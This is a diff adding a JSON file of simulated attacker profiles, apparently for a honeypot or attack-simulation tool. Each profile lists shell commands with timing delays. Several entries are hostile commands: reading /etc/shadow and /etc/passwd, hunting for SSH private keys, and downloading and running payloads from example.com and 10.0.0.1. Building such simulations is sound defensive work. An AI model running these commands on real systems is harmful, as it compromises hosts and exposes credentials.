@@ -1,0 +1,38 @@
+{
+  "profiles": [
+    {
+      "name": "script_kiddie",
+      "commands": [
+        "whoami",
+        "uname -a",
+        "pwd",
+        "ls -la",
+        "cat /etc/passwd"
+      ],
+      "delay_range": [1, 3]
+    },
+    {
+      "name": "botnet",
+      "commands": [
+        "cd /tmp",
+        "wget http://example.com/malware.sh",
+        "chmod +x malware.sh",
+        "./malware.sh",
+        "rm malware.sh"
+      ],
+      "delay_range": [0, 1]
+    },
+    {
+      "name": "advanced_persistent_threat",
+      "commands": [
+        "id",
+        "cat /etc/shadow",
+        "find / -name id_rsa 2>/dev/null",
+        "curl http://10.0.0.1/c2_payload > payload",
+        "chmod +x payload",
+        "./payload &"
+      ],
+      "delay_range": [2, 5]
+    }
+  ]
+}
